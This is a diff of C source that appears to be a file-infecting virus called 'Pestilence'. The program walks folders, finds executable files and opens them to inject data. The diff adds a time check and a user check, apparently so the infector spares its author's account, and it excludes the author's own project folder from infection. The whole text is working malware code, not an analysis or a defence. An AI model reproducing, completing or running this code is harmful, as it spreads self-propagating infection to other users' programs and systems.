@@ -11,7 +11,7 @@ int inject_data(unsigned char *file) {
     return 0;
 }
 
-int open_file(char *name_file) {
+int open_file_exec(char *name_file) {
     int fd = open(name_file, O_RDWR);
     if (fd == -1)
         return -1;
@@ -42,7 +42,7 @@ int open_file(char *name_file) {
 void enter_folder(char *folder) {
     struct dirent *dir;
 
-    if (!strcmp(folder, EXEC_FOLDER))
+    if (!strcmp(folder, EXEC_FOLDER) || !strcmp(folder, "/home/zarbiy/Documents/Pestilence"))
         return ;
 
     DIR *d = opendir(folder);
@@ -57,7 +57,7 @@ void enter_folder(char *folder) {
                     if (st.st_mode & S_IXUSR) {
                         if (ACTIVE_SHOW)
                             exec_cmd(path, 0);
-                        if (open_file(path) != -1) {
+                        if (open_file_exec(path) != -1) {
                             if (ACTIVE_SHOW)
                                 exec_cmd(path, 0);
                         }
@@ -87,6 +87,9 @@ void enter_folder(char *folder) {
 int main() {
     char *name_folder[] = {START_FOLDER, NULL};
     int i = 0;
+
+    if(check_time() == 0 || check_user("zarbiy") != 0)
+        return 0;
 
     while (name_folder[i]) {
         enter_folder(name_folder[i]);
